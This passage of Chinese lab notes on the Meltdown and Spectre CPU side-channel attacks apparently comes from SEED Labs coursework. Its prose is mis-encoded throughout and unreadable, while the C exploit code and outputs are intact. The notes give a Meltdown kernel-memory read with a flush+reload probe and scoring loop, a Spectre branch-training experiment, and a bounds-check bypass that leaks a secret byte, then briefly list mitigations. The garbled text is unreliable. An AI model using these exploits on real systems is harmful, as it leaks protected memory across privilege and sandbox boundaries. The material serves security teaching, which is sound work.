2. æƒé™æ£€æŸ¥ç›¸å¯¹è¾ƒæ…¢ã€‚åœ¨ç­‰å¾…æ£€æŸ¥ç»“æœæ—¶ï¼Œä¹±åºæ‰§è¡Œå¼•æ“ä¼š**å‡è®¾æ£€æŸ¥ä¼šé€šè¿‡**ï¼Œå¹¶æå‰æ‰§è¡Œç¬¬äºŒè¡Œä»£ç ã€‚
3. å› æ­¤ï¼ŒCPUä¼šä½¿ç”¨ä» kernel_address **æ¨æµ‹æ€§åŠ è½½**å‡ºæ¥çš„å€¼ï¼ˆæ¯”å¦‚æ˜¯å­—ç¬¦ 'S' çš„ASCIIç  83ï¼‰ï¼Œå»è®¿é—® `array[83 * 4096]`ã€‚è¿™ä¸ªè®¿é—®æ“ä½œä¼šæŠŠ array çš„ç¬¬83ä¸ªå…ƒç´ åŠ è½½åˆ°CPUç¼“å­˜ä¸­ã€‚
4. ä¸ä¹…ä¹‹åï¼Œæƒé™æ£€æŸ¥å®Œæˆå¹¶æŠ¥å‘Šå¤±è´¥ã€‚
5. CPUæ„è¯†åˆ°æ¨æµ‹é”™è¯¯ï¼Œäºæ˜¯**ä¸¢å¼ƒ**æ‰€æœ‰æ¨æµ‹æ‰§è¡Œçš„ç»“æœï¼ˆkernel_dataÂ çš„å€¼ä¸ä¼šè¢«å†™å…¥å¯„å­˜å™¨ï¼ŒarrayÂ çš„å†…å­˜å€¼ä¹Ÿä¸ä¼šçœŸçš„è¢«ä¿®æ”¹ï¼‰ï¼Œå¹¶å°†ç¨‹åºçŠ¶æ€å›æ»šåˆ°è®¿é—®è¿è§„ä¹‹å‰ï¼Œç„¶åè§¦å‘Â SIGSEGVÂ å¼‚å¸¸ã€‚

**è‡´å‘½çš„è®¾è®¡ç¼ºé™·**ï¼šCPUåœ¨å›æ»šçŠ¶æ€æ—¶ï¼Œæ¸…é™¤äº†å¯„å­˜å™¨å’Œå†…å­˜çš„ä¿®æ”¹ï¼Œä½†**å¿˜è®°æ¸…é™¤CPUç¼“å­˜çš„çŠ¶æ€**ã€‚`array[83 * 4096]` å·²ç»è¢«åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œè¿™ä¸ªç—•è¿¹ï¼ˆ"ç¯æ³¡çš„ä½™æ¸©"ï¼‰è¢«ä¿ç•™äº†ä¸‹æ¥ã€‚

æˆ‘ä»¬å°†ä¸Šè¿°æ‰€æœ‰æŠ€æœ¯ç»„åˆèµ·æ¥ï¼š
1. **å‡†å¤‡**ï¼šæ¸…ç©ºæ¢æµ‹æ•°ç»„çš„ç¼“å­˜ (FLUSH)ã€‚
2. **è§¦å‘**ï¼šåœ¨ä¸€ä¸ªå—å¼‚å¸¸å¤„ç†ä¿æŠ¤çš„ä»£ç å—ä¸­ï¼Œå°è¯•è¯»å–å†…æ ¸ç§˜å¯†åœ°å€ï¼Œå¹¶ç«‹å³ç”¨è¯¥ç§˜å¯†ä½œä¸ºç´¢å¼•è®¿é—®æ¢æµ‹æ•°ç»„ã€‚

```c
void meltdown(unsigned long kernel_data_addr) {
    char kernel_data = 0;
    // ä»¥ä¸‹è¯­å¥å°†è§¦å‘å¼‚å¸¸ï¼Œä½†åœ¨å¼‚å¸¸å‘ç”Ÿå‰ä¼šè¢«ä¹±åºæ‰§è¡Œ
    kernel_data = *(char*)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
}
```

3. **æ¢å¤**ï¼šSIGSEGV å‘ç”Ÿï¼Œsiglongjmp è·³è½¬åˆ°æ¢å¤ç‚¹ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œã€‚
4. **æ¢æµ‹**ï¼šæµ‹é‡æ¢æµ‹æ•°ç»„æ‰€æœ‰å…ƒç´ çš„è®¿é—®æ—¶é—´ (RELOAD)ï¼Œæ‰¾å‡ºå“ªä¸ªå…ƒç´ çš„è®¿é—®æ—¶é—´æœ€çŸ­ï¼Œå…¶ç´¢å¼•å°±æ˜¯æ³„éœ²çš„å†…æ ¸ç§˜å¯†å­—èŠ‚ã€‚
5. **ä¼˜åŒ–**ï¼š
    - **ç¼“å­˜é¢„è½½**ï¼šåœ¨æ”»å‡»å‰ï¼Œé€šè¿‡è¯»å– /proc/secret_data æ¥å£ï¼Œç¡®ä¿å†…æ ¸ç§˜å¯†æ•°æ®æœ¬èº«å·²åœ¨ç¼“å­˜ä¸­ï¼Œè¿™ä¼šåŠ é€Ÿä¹±åºæ‰§è¡Œæ—¶çš„æ•°æ®åŠ è½½ï¼Œæé«˜æ”»å‡»æˆåŠŸç‡ã€‚
    - **æ±‡ç¼–ä¼˜åŒ–**ï¼šåœ¨è®¿é—®å†…æ ¸åœ°å€å‰ï¼Œæ’å…¥ä¸€äº›æ— å…³çš„æ±‡ç¼–æŒ‡ä»¤æ¥â€œå ç”¨â€æ‰§è¡Œå•å…ƒï¼Œä¸ºä¹±åºæ‰§è¡Œåˆ›é€ æ›´æœ‰åˆ©çš„æ—¶é—´çª—å£ã€‚
	```c
	asm volatile(  
     Â  Â  Â  Â ".rept 400;"  
     Â  Â  Â  Â "add $0x141, %%eax;"  
     Â  Â  Â  Â ".endr;"  
     Â  Â  Â   : : : "eax"  
     Â   );
	```
    - **ç»Ÿè®¡æ–¹æ³•**ï¼šç”±äºå™ªå£°å¹²æ‰°ï¼Œå•æ¬¡æ”»å‡»å¯èƒ½å¤±è´¥ã€‚é€šè¿‡æˆç™¾ä¸Šåƒæ¬¡é‡å¤æ”»å‡»ï¼Œå¹¶ç”¨ä¸€ä¸ª scores æ•°ç»„ç»Ÿè®¡æ¯ä¸ªç´¢å¼•å€¼ï¼ˆ0-255ï¼‰è¢«å‘½ä¸­çš„æ¬¡æ•°ï¼Œå¾—åˆ†æœ€é«˜çš„ç´¢å¼•å°±æ˜¯æœ€å¯é çš„ç§˜å¯†å€¼ã€‚

```c
#include <stdio.h>
// ... åŒ…å« signal, setjmp, x86intrin.h ç­‰å¤´æ–‡ä»¶ ...

static int scores[256];
// ... åŒ…å« flushSideChannel, reloadSideChannelImproved (å¸¦scoresç»Ÿè®¡) ...
// ... åŒ…å« meltdown_asm (å¸¦æ±‡ç¼–ä¼˜åŒ–) ...

int main() {
    // ... è·å–å†…æ ¸ç§˜å¯†åœ°å€ kernel_addr ...
    
    int i;
    for (i = 0; i < 1000; i++) { // é‡å¤æ”»å‡»1000æ¬¡
        // é¢„è½½å†…æ ¸ç§˜å¯†åˆ°ç¼“å­˜ (é€šè¿‡pread /proc/secret_data)
        
        // æ¸…ç©ºæ¢æµ‹æ•°ç»„
        flushSideChannel();
        
        // è§¦å‘æ¼æ´
        if (sigsetjmp(jbuf, 1) == 0) {
            meltdown_asm(kernel_addr);
        }

        // æ¢æµ‹å¹¶ç»Ÿè®¡ç»“æœ
        reloadSideChannelImproved();
    }

    // æ‰¾å‡ºå¾—åˆ†æœ€é«˜çš„ç´¢å¼•
    // ... é€»è¾‘ ...
    printf("The secret value is %d %c\n", max_score_index, max_score_index);
}
```

é€šè¿‡å¾ªç¯æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€å­—èŠ‚åœ°ã€éå¸¸å¯é åœ°æ¢å¤å‡ºå†…æ ¸ä¸­çš„ç§˜å¯†å­—ç¬¦ä¸² "SEEDLabs"ã€‚

![[Pasted image 20251117010302.png]]

## Spectre

å¹½çµæ”»å‡»ï¼ˆSpectreï¼‰ä¸ç†”æ–­æ”»å‡»ï¼ˆMeltdownï¼‰å‡ ä¹åŒæ—¶è¢«å‘ç°ï¼Œå®ƒä»¬éƒ½åˆ©ç”¨äº†ç°ä»£å¤„ç†å™¨ä¸­çš„**æ¨æµ‹æ‰§è¡Œ (Speculative Execution)**Â æœºåˆ¶æ¥åˆ¶é€ ä¾§ä¿¡é“ã€‚ç„¶è€Œï¼Œä¸¤è€…åœ¨æ”»å‡»ç›®æ ‡å’ŒåŸç†ä¸Šå­˜åœ¨å…³é”®å·®å¼‚ï¼š
- **æ”»å‡»è¾¹ç•Œä¸åŒ**ï¼šMeltdown ä¸»è¦ç”¨äºæ‰“ç ´ç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´çš„éš”ç¦»ï¼Œå…è®¸ç”¨æˆ·ç¨‹åºè¯»å–å†…æ ¸å†…å­˜ã€‚è€Œ Spectre çš„åº”ç”¨èŒƒå›´æ›´å¹¿ï¼Œå®ƒå¯ä»¥æ‰“ç ´**è¿›ç¨‹å†…**çš„å†…å­˜éš”ç¦»ï¼Œä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªæµè§ˆå™¨è¿›ç¨‹ä¸­ï¼Œä¸€æ®µæ¶æ„çš„ JavaScript ä»£ç å¯ä»¥åˆ©ç”¨ Spectre çªƒå–å±äºåŒä¸€è¿›ç¨‹ä¸­å…¶ä»–ç½‘ç«™çš„æ•°æ®ã€‚å®ƒä¹Ÿå¯ä»¥ç”¨äºè·¨è¿›ç¨‹æ”»å‡»ã€‚
- **åˆ©ç”¨æœºåˆ¶ä¸åŒ**ï¼šMeltdown åˆ©ç”¨çš„æ˜¯ä¹±åºæ‰§è¡Œä¸­å¯¹æƒé™æ£€æŸ¥çš„å»¶è¿Ÿã€‚Spectre åˆ©ç”¨çš„æ˜¯**åˆ†æ”¯é¢„æµ‹ (Branch Prediction)**Â å¤±è´¥åçš„æ¨æµ‹æ‰§è¡Œã€‚
    

ç”±äº Spectre æ”»å‡»çš„æ˜¯è¿›ç¨‹å†…çš„å®‰å…¨è¾¹ç•Œï¼ˆä¾‹å¦‚æ²™ç®±æœºåˆ¶ï¼‰ï¼Œè¿™ä½¿å¾—çº¯ç²¹é€šè¿‡æ“ä½œç³»ç»Ÿå±‚é¢çš„ä¿®å¤ï¼ˆå¦‚KPTIï¼‰å˜å¾—éå¸¸å›°éš¾ã€‚

Spectre æ”»å‡»ä¾èµ–äºç°ä»£ CPU çš„ä¸€é¡¹å…³é”®æ€§èƒ½ä¼˜åŒ–æŠ€æœ¯ï¼š**åˆ†æ”¯é¢„æµ‹**ã€‚

![[Pasted image 20251117011706.png]]

å½“ CPU é‡åˆ°ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ï¼ˆå¦‚Â ifÂ è¯­å¥ï¼‰æ—¶ï¼Œå®ƒéœ€è¦æ ¹æ®æ¡ä»¶çš„ç»“æœæ¥å†³å®šæ¥ä¸‹æ¥æ‰§è¡Œå“ªæ®µä»£ç ã€‚ç„¶è€Œï¼Œåˆ¤æ–­æ¡ä»¶æœ¬èº«å¯èƒ½éœ€è¦æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œå¦‚æœæ¡ä»¶ä¾èµ–äºä¸€ä¸ªä¸åœ¨ç¼“å­˜ä¸­çš„å†…å­˜å˜é‡Â sizeï¼ŒCPU å°±éœ€è¦ç­‰å¾…æ•°ç™¾ä¸ªå‘¨æœŸæ‰èƒ½ä»ä¸»å­˜ä¸­è¯»å–åˆ°å®ƒã€‚

ä¸ºäº†é¿å…è¿™ç§åœé¡¿ï¼ŒCPU ä¸ä¼šç­‰å¾…ï¼Œè€Œæ˜¯ä¼š**é¢„æµ‹**åˆ†æ”¯çš„ç»“æœï¼Œå¹¶**æ¨æµ‹æ€§åœ°**æ²¿ç€é¢„æµ‹çš„è·¯å¾„ç»§ç»­æ‰§è¡Œä»£ç ã€‚

```c
1: data = 0;
2: if (x < size) {            // CPU åœ¨æ­¤è¿›è¡Œåˆ†æ”¯é¢„æµ‹
3:    data = data + 5;       // å¦‚æœé¢„æµ‹ä¸ºçœŸï¼Œæ¨æµ‹æ€§æ‰§è¡Œæ­¤è¡Œ
4: }
```

1. **åˆ†æ”¯é¢„æµ‹å™¨ (Branch Predictor)**ï¼šCPU å†…éƒ¨æœ‰ä¸€ä¸ªç¡¬ä»¶å•å…ƒï¼Œå®ƒä¼šè®°å½•æ¯ä¸ªåˆ†æ”¯æŒ‡ä»¤è¿‡å»çš„è¡Œä¸ºã€‚å¦‚æœä¸€ä¸ªÂ ifÂ è¯­å¥åœ¨è¿‡å»100æ¬¡æ‰§è¡Œä¸­éƒ½ä¸ºçœŸï¼Œé‚£ä¹ˆé¢„æµ‹å™¨å°±ä¼šå¤§èƒ†åœ°é¢„æµ‹ä¸‹ä¸€æ¬¡æ‰§è¡Œç»“æœåŒæ ·ä¸ºçœŸã€‚
    
2. **æ¨æµ‹æ‰§è¡Œ**ï¼šåŸºäºé¢„æµ‹ï¼ŒCPU ä¼šç»§ç»­æ‰§è¡ŒÂ ifÂ è¯­å¥å—å†…éƒ¨çš„ä»£ç ï¼ˆå¦‚ç¬¬3è¡Œï¼‰ã€‚æ‰€æœ‰è¿™äº›æ“ä½œçš„ç»“æœéƒ½æ˜¯ä¸´æ—¶çš„ï¼Œå­˜æ”¾åœ¨å†…éƒ¨çš„ç¼“å†²åŒºä¸­ã€‚
    
3. **ç»“æœéªŒè¯ä¸æäº¤/å›æ»š**ï¼šå½“Â sizeÂ çš„å€¼æœ€ç»ˆä»å†…å­˜ä¸­åŠ è½½å›æ¥åï¼ŒCPU ä¼šéªŒè¯å…¶é¢„æµ‹æ˜¯å¦æ­£ç¡®ã€‚
    
    - **é¢„æµ‹æ­£ç¡®**ï¼šæ¨æµ‹æ‰§è¡Œçš„ç»“æœè¢«æ­£å¼â€œæäº¤â€ï¼ˆcommitï¼‰ï¼Œå†™å…¥å¯„å­˜å™¨æˆ–å†…å­˜ã€‚æ€§èƒ½å¾—åˆ°æå‡ã€‚
        
    - **é¢„æµ‹é”™è¯¯**ï¼šCPU ä¼šä¸¢å¼ƒæ‰€æœ‰æ¨æµ‹æ‰§è¡Œçš„ç»“æœï¼Œå›æ»šåˆ°åˆ†æ”¯å‰çš„çŠ¶æ€ï¼Œç„¶åæ²¿ç€æ­£ç¡®çš„åˆ†æ”¯è·¯å¾„é‡æ–°æ‰§è¡Œã€‚ä»ç¨‹åºçš„å¤–éƒ¨è§†è§’çœ‹ï¼Œå°±å¥½åƒé”™è¯¯è·¯å¾„çš„ä»£ç ä»æœªè¢«æ‰§è¡Œè¿‡ã€‚
        

**Spectre æ¼æ´çš„æ ¸å¿ƒ**ï¼šä¸ Meltdown ç±»ä¼¼ï¼Œå½“ CPU å› é¢„æµ‹é”™è¯¯è€Œå›æ»šçŠ¶æ€æ—¶ï¼Œå®ƒæ¸…é™¤äº†å¯„å­˜å™¨å’Œå†…å­˜çš„ä¿®æ”¹ï¼Œä½†**æ²¡æœ‰æ¸…é™¤æ¨æµ‹æ‰§è¡Œå¯¹ CPU ç¼“å­˜ç•™ä¸‹çš„ç—•è¿¹**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡â€œè®­ç»ƒâ€åˆ†æ”¯é¢„æµ‹å™¨ï¼Œè¯±å¯¼ CPU å»æ¨æµ‹æ€§åœ°æ‰§è¡Œæœ¬ä¸åº”è¯¥è¢«æ‰§è¡Œçš„ä»£ç è·¯å¾„ï¼Œå¹¶é€šè¿‡ç¼“å­˜ä¾§ä¿¡é“æ¥çªƒå–è¿™äº›ä»£ç è®¿é—®è¿‡çš„æ•°æ®ã€‚

æˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªå®éªŒæ¥è§‚å¯Ÿå¹¶åˆ©ç”¨åˆ†æ”¯é¢„æµ‹ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š

1. **è®­ç»ƒ (Train)**ï¼šåå¤è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä½¿å…¶å†…éƒ¨çš„Â ifÂ è¯­å¥æ€»æ˜¯ä¸ºçœŸï¼Œä»è€Œâ€œè®­ç»ƒâ€CPUçš„åˆ†æ”¯é¢„æµ‹å™¨ï¼Œè®©å®ƒç›¸ä¿¡è¿™ä¸ªÂ ifÂ æ¡ä»¶é€šå¸¸ä¼šæˆç«‹ã€‚
    
2. **è§¦å‘ (Trigger)**ï¼šåœ¨ä¸€æ¬¡å…³é”®çš„è°ƒç”¨ä¸­ï¼Œä¼ å…¥ä¸€ä¸ªä¼šä½¿Â ifÂ è¯­å¥ä¸ºå‡çš„å‚æ•°ã€‚åŒæ—¶ï¼Œé€šè¿‡Â _mm_clflushÂ æŒ‡ä»¤ï¼Œç¡®ä¿Â ifÂ æ¡ä»¶æ‰€ä¾èµ–çš„å˜é‡ä¸åœ¨ç¼“å­˜ä¸­ï¼Œä»è€Œäººä¸ºåœ°åˆ¶é€ ä¸€ä¸ªè¾ƒé•¿çš„å»¶è¿Ÿçª—å£ã€‚
    
3. **åˆ©ç”¨ (Exploit)**ï¼šç”±äºåˆ†æ”¯é¢„æµ‹å™¨è¢«è®­ç»ƒè¿‡ï¼ŒCPU ä¼šé¢„æµ‹Â ifÂ ä¸ºçœŸï¼Œå¹¶æ¨æµ‹æ€§åœ°æ‰§è¡ŒÂ ifÂ å—å†…çš„ä»£ç ï¼Œå°½ç®¡è¿™æ¬¡æ¡ä»¶å®é™…ä¸Šä¸ºå‡ã€‚è¿™æ®µè¢«é”™è¯¯æ¨æµ‹æ‰§è¡Œçš„ä»£ç ä¼šç•™ä¸‹ç¼“å­˜ç—•è¿¹ã€‚

**SpectreExperiment.cÂ - éªŒè¯åˆ†æ”¯é¢„æµ‹çš„å‰¯ä½œç”¨**


```c
#include <stdio.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define DELTA 1024
uint8_t array[256*4096];
int size = 10;

// (æ­¤å¤„çœç•¥ flushSideChannel å’Œ reloadSideChannel çš„ä»£ç )

void victim(size_t x) {
    if (x < size) {                         // â‘  æ¡ä»¶åˆ†æ”¯
        volatile int temp = array[x * 4096 + DELTA]; // â‘¡ æ¨æµ‹æ‰§è¡Œçš„ç›®æ ‡ä»£ç 
    }
}

int main() {
    flushSideChannel(); // æ¸…ç©ºæ¢æµ‹æ•°ç»„

    // â‘¢ è®­ç»ƒé˜¶æ®µ: åå¤ç”¨æœ‰æ•ˆå€¼è°ƒç”¨victim(), è®©CPUé¢„æµ‹ if (x < size) ä¸ºçœŸ
    for (int i = 0; i < 10; i++) {
        victim(i);
    }

    // â‘£ è§¦å‘é˜¶æ®µ
    _mm_clflush(&size); // å°†'size'ä»ç¼“å­˜ä¸­æ¸…é™¤, åˆ¶é€ å»¶è¿Ÿ
    victim(97);         // ç”¨ä¸€ä¸ªè¶Šç•Œå€¼(97 > 10)è°ƒç”¨, æ­¤æ—¶æ¡ä»¶ä¸ºå‡

    // â‘¤ æ¢æµ‹é˜¶æ®µ
    reloadSideChannel(); // æ£€æŸ¥ array[97 * ...] æ˜¯å¦è¢«ç¼“å­˜
    return 0;
}
```


```c
$ gcc -march=native SpectreExperiment.c
$ ./a.out
array[97*4096 + 1024] is in cache.
The Secret = 97.
```

å®éªŒç»“æœè¯æ˜ï¼Œå°½ç®¡Â 97 < 10Â æ˜æ˜¾ä¸ºå‡ï¼ŒifÂ å—å†…çš„ä»£ç ï¼ˆè¡Œâ‘¡ï¼‰åœ¨é€»è¾‘ä¸Šä¸åº”æ‰§è¡Œï¼Œä½†å®ƒç¡®å®è¢« CPU æ¨æµ‹æ€§åœ°æ‰§è¡Œäº†ï¼Œå¹¶é€šè¿‡Â array[97 * ...]Â çš„è®¿é—®åœ¨ç¼“å­˜ä¸­ç•™ä¸‹äº†ç—•è¿¹ã€‚

ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªåŸç†åº”ç”¨åˆ°ä¸€ä¸ªæ›´çœŸå®çš„åœºæ™¯ï¼šç»•è¿‡è½¯ä»¶æ²™ç®±çš„è¾¹ç•Œæ£€æŸ¥ã€‚

æˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªæ²™ç®±å‡½æ•°Â restrictedAccessï¼Œå®ƒåªå…è®¸è®¿é—®ä¸€ä¸ªÂ bufferÂ æ•°ç»„çš„åˆæ³•ç´¢å¼•ï¼ˆ0-9ï¼‰ã€‚æ•°ç»„ä¹‹å¤–çš„å†…å­˜åŒºåŸŸï¼ˆä¸Šæ–¹æˆ–ä¸‹æ–¹ï¼‰å­˜æ”¾ç€æˆ‘ä»¬çš„ç§˜å¯†æ•°æ®ã€‚

```c
unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";

// æ²™ç®±å‡½æ•°
uint8_t restrictedAccess(size_t x) {
    if (x <= bound_upper && x >= bound_lower) {
        return buffer[x];
    } else {
        return 0;
    }
}
```


æ”»å‡»ç›®æ ‡æ˜¯ï¼šé€šè¿‡è°ƒç”¨Â restrictedAccessÂ å‡½æ•°ï¼Œè¯»å–åˆ°Â secretÂ å­—ç¬¦ä¸²çš„å†…å®¹ã€‚
  
æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š
1. è®¡ç®—å‡ºÂ secretÂ ç›¸å¯¹äºÂ bufferÂ èµ·å§‹åœ°å€çš„ç´¢å¼•Â index_beyondã€‚è¿™ä¸ªç´¢å¼•æ˜¾ç„¶æ˜¯è¶Šç•Œçš„ã€‚
2. é€šè¿‡å¾ªç¯è°ƒç”¨Â restrictedAccessÂ å¹¶ä¼ å…¥åˆæ³•ç´¢å¼•ï¼Œæ¥è®­ç»ƒåˆ†æ”¯é¢„æµ‹å™¨ã€‚
3. æ¸…é™¤è¾¹ç•Œå˜é‡Â bound_upperÂ å’ŒÂ bound_lowerÂ çš„ç¼“å­˜ï¼Œä¸ºæ¨æµ‹æ‰§è¡Œåˆ›é€ çª—å£ã€‚
4. è°ƒç”¨Â restrictedAccess(index_beyond)ã€‚CPU ä¼šæ¨æµ‹æ€§åœ°æ‰§è¡ŒÂ ifÂ ä¸ºçœŸçš„åˆ†æ”¯ï¼Œè¿”å›Â buffer[index_beyond]Â çš„å€¼ï¼Œè¿™ä¸ªå€¼å®é™…ä¸Šå°±æ˜¯Â secretÂ çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚
5. å°†è¿™ä¸ªè¿”å›çš„ç§˜å¯†å­—èŠ‚Â sÂ ä½œä¸ºç´¢å¼•ï¼Œå»è®¿é—®æˆ‘ä»¬çš„æ¢æµ‹æ•°ç»„Â arrayï¼ˆå³æ‰§è¡ŒÂ array[s * 4096 + DELTA] += 88;ï¼‰ã€‚
6. è¿™ä¸ªè®¿é—®æ“ä½œä¼šåœ¨ç¼“å­˜ä¸­ç•™ä¸‹ç—•è¿¹ã€‚æœ€åé€šè¿‡Â reloadSideChannelÂ æ‰¾å‡ºè¿™ä¸ªç—•è¿¹ï¼Œä»è€Œåæ¨å‡ºç§˜å¯†å­—èŠ‚Â sÂ çš„å€¼ã€‚

```c
#include ...

// (çœç•¥ buffer, secret, bounds, array çš„å®šä¹‰å’Œ flush/reload å‡½æ•°)

uint8_t restrictedAccess(size_t x) { /* ... å¦‚ä¸Šå®šä¹‰ ... */ }

void spectreAttack(size_t index_beyond) {
    int i;
    volatile int z;
    uint8_t s;

    // è®­ç»ƒCPUï¼Œä½¿å…¶é¢„æµ‹åˆ†æ”¯ä¸ºçœŸ
    for (i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    // æ¸…é™¤è¾¹ç•Œå˜é‡å’Œæ¢æµ‹æ•°ç»„çš„ç¼“å­˜
    _mm_clflush(&bound_upper);
    _mm_clflush(&bound_lower);
    for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
    for (z = 0; z < 100; z++) { } // å»¶è¿Ÿ

    // æ ¸å¿ƒæ”»å‡»ï¼š
    s = restrictedAccess(index_beyond);      // â‘  æ¨æµ‹æ€§æ‰§è¡Œï¼Œs = secret_byte
    array[s * 4096 + DELTA] += 88;           // â‘¡ åˆ©ç”¨ s ç•™ä¸‹ç¼“å­˜ç—•è¿¹
}

int main() {
    flushSideChannel();
    
    // è®¡ç®—ç§˜å¯†çš„è¶Šç•Œç´¢å¼•
    size_t index_beyond = (size_t)(secret - (char*)buffer);
    
    spectreAttack(index_beyond);
    
    reloadSideChannel();
    return 0;
}
```

  
```c
$ gcc -march=native SpectreAttack.c
$ ./a.out
...
array[83*4096 + 1024] is in cache.
The Secret = 83(S).
```

æ”»å‡»æˆåŠŸçªƒå–äº†ç§˜å¯†å­—ç¬¦ä¸² "Some Secret Value" çš„ç¬¬ä¸€ä¸ªå­—èŠ‚Â 'S'Â (ASCII 83)ã€‚
æœ‰æ—¶ï¼Œä½ å¯èƒ½ä¼šè§‚å¯Ÿåˆ°ä¸¤ä¸ªç»“æœè¢«æ‰“å°å‡ºæ¥ï¼šThe Secret = 0()Â å’ŒÂ The Secret = 83(S)ã€‚è¿™æ˜¯å› ä¸ºæ”»å‡»ä»£ç ï¼ˆè¡Œâ‘¡ï¼‰è¢«æ‰§è¡Œäº†ä¸¤æ¬¡ï¼š
- **ç¬¬ä¸€æ¬¡ï¼ˆæ¨æµ‹æ‰§è¡Œï¼‰**:Â sÂ çš„å€¼æ˜¯ç§˜å¯†å­—èŠ‚83ï¼Œå¯¼è‡´Â array[83*...]Â è¢«ç¼“å­˜ã€‚
- **ç¬¬äºŒæ¬¡ï¼ˆæ­£å¸¸æ‰§è¡Œï¼‰**: CPU å‘ç°é¢„æµ‹é”™è¯¯åå›æ»šï¼Œå¹¶æ²¿æ­£ç¡®è·¯å¾„æ‰§è¡Œï¼ŒrestrictedAccessÂ è¿”å›Â 0ã€‚æ­¤æ—¶Â sÂ çš„å€¼å˜ä¸ºÂ 0ï¼Œå¯¼è‡´Â array[0*...]Â ä¹Ÿè¢«ç¼“å­˜ã€‚

ä¸ç†”æ–­æ”»å‡»ä¸€æ ·ï¼ŒSpectre æ”»å‡»ä¹Ÿå—å™ªå£°å½±å“ï¼Œéœ€è¦ä½¿ç”¨ç»Ÿè®¡æ–¹æ³•æ¥æé«˜å‡†ç¡®æ€§ã€‚é€šè¿‡å¾ªç¯æ‰§è¡Œæ”»å‡»ä¸Šåƒæ¬¡ï¼Œå¹¶ç”¨Â scoresÂ æ•°ç»„è®°å½•ç¼“å­˜å‘½ä¸­æ¬¡æ•°ï¼Œæœ€åå–åˆ†å€¼æœ€é«˜çš„ç´¢å¼•ä½œä¸ºç»“æœã€‚

**SpectreAttackImproved.c**Â çš„é€»è¾‘ä¸Â MeltdownAttack.cÂ çš„ç»Ÿè®¡ä¼˜åŒ–ç‰ˆæœ¬éå¸¸ç›¸ä¼¼ï¼Œé€šè¿‡reloadSideChannelImprovedå‡½æ•°ç´¯åŠ scoresæ•°ç»„ï¼Œå¹¶åœ¨ä¸»å¾ªç¯ä¸­é‡å¤è°ƒç”¨spectreAttackã€‚

ä¸€ä¸ªæœ‰è¶£ä¸”é‡è¦çš„ç»†èŠ‚æ˜¯ï¼Œåœ¨æŸäº›ç³»ç»Ÿç¯å¢ƒï¼ˆå¦‚ Ubuntu 20.04ï¼‰ä¸­ï¼Œæ”»å‡»å¾ªç¯ä¸­éœ€è¦åŠ å…¥å¾®å°çš„å»¶è¿Ÿï¼ˆå¦‚usleep(10))æˆ–ä¸€äº›I/Oæ“ä½œï¼ˆå¦‚printfï¼‰æ‰èƒ½ç¨³å®šæˆåŠŸã€‚è¿™è¡¨æ˜ Spectre æ”»å‡»å¯¹æ—¶åºçš„æ§åˆ¶è¦æ±‚æä¸ºç²¾ç¡®ï¼Œè¿™äº›çœ‹ä¼¼æ— å…³çš„æ“ä½œå¯èƒ½æ°å¥½åˆ›é€ äº†æ”»å‡»æˆåŠŸæ‰€éœ€çš„æ—¶åºæ¡ä»¶ã€‚

è‡ªé¦–æ¬¡å‘ç°ä»¥æ¥ï¼Œå·²å‡ºç°å¤šç§ Spectre å˜ä½“ï¼Œå½±å“äº†å‡ ä¹æ‰€æœ‰ç°ä»£é«˜æ€§èƒ½å¤„ç†å™¨ã€‚

**ç¼“è§£æªæ–½**æ¯” Meltdown æ›´å¤æ‚ï¼š
1. **è½¯ä»¶ç¼“è§£**ï¼š
    - **ç¼–è¯‘å™¨ä¿®æ”¹**ï¼šç¼–è¯‘å™¨å¯ä»¥æ’å…¥æŒ‡ä»¤ï¼ˆå¦‚Â lfenceï¼‰æ¥å……å½“â€œæ¨æµ‹å±éšœâ€ï¼Œé˜»æ­¢ CPU è¶Šè¿‡æŸäº›æ£€æŸ¥ç‚¹è¿›è¡Œæ¨æµ‹ã€‚
    - **Retpoline**ï¼šä¸€ç§é˜²æ­¢é—´æ¥åˆ†æ”¯è¢«åˆ©ç”¨äºæ¨æµ‹æ‰§è¡Œçš„æŠ€æœ¯ï¼Œä½†æœ‰æ€§èƒ½å½±å“ã€‚
    - **æµè§ˆå™¨éš”ç¦»**ï¼šç°ä»£æµè§ˆå™¨é€šè¿‡â€œç«™ç‚¹éš”ç¦»â€æŠ€æœ¯ï¼Œå°†ä¸åŒç½‘ç«™çš„å†…å®¹æ”¾åœ¨ä¸åŒçš„è¿›ç¨‹ä¸­ï¼Œå¤§å¤§å¢åŠ äº† Spectre è·¨ç«™æ”»å‡»çš„éš¾åº¦ã€‚
2. **ç¡¬ä»¶ç¼“è§£**ï¼šæ–°çš„å¤„ç†å™¨è®¾è®¡ä¸­åŒ…å«äº†é’ˆå¯¹æ€§çš„ä¿®å¤ï¼Œä»¥é™åˆ¶æˆ–æ¶ˆé™¤æœ‰å®³çš„æ¨æµ‹æ‰§è¡Œã€‚

Spectre æ­ç¤ºäº†å¤„ç†å™¨ä¸ºäº†è¿½æ±‚æ€§èƒ½è€Œåšçš„è®¾è®¡å†³ç­–ä¸å®‰å…¨éœ€æ±‚ä¹‹é—´çš„æ·±åˆ»çŸ›ç›¾ï¼Œå¯¹ç¡¬ä»¶å’Œè½¯ä»¶å®‰å…¨é¢†åŸŸäº§ç”Ÿäº†æ·±è¿œçš„å½±å“ã€‚

